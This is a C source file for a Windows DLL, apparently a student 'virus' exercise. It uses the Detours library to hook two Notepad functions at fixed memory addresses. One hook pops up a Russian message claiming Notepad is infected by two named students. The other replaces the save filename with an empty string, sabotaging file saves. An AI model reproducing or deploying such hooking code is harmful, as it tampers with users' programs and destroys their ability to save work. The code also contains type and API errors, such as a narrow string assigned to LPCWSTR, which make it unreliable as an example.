#include <Windows.h>
#include <detours.h>
#pragma comment(lib, "detours.lib")

int (__stdcall* InsertDateTime)(int x);

int MyInsertDateTime(int x) 
{
	MessageBox(NULL, "Блокнот заражен студентами группы 4362\n Степановым Н.С. и Головым Д.А.\nПользуйтель и не переживайте за свою безопасность.", "Блокнот с вирусом!", MB_WARNING);
	return InsertDateTime(x); 
}

int (__stdcall* SaveFile)(HWND hWnd, LPCWSTR lpFileName, LPCWSTR lpWideCharStr);

int MyInsertText(HWND hWnd, LPCWSTR lpFileName, LPCWSTR lpWideCharStr)
{
	LPCWSTR myText = "";
	return SaveFile(hWnd, myText, lpWideCharStr); 
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
		case DLL_PROCESS_ATTACH: //On dll attach
			InsertDateTime = (int (__stdcall*)(int))DetourFunction((PBYTE)0x01006F10, (PBYTE)MyInsertDateTime);
			SaveFile = (int (__stdcall*)(HWND,LPCWSTR,LPCWSTR))DetourFunction((PBYTE)0x01004EAE, (PBYTE)MyInsertText);
		break;
		case DLL_THREAD_ATTACH: //On thread attach
		break;
		case DLL_THREAD_DETACH: //On thread detach
			DetourRemove((PBYTE)0x1006F10, (PBYTE)InsertDateTime);
			DetourRemove((PBYTE)0x01004EAE, (PBYTE)SaveFile);
		break;
		case DLL_PROCESS_DETACH: //on process detach
		break;
	}
	return TRUE;
}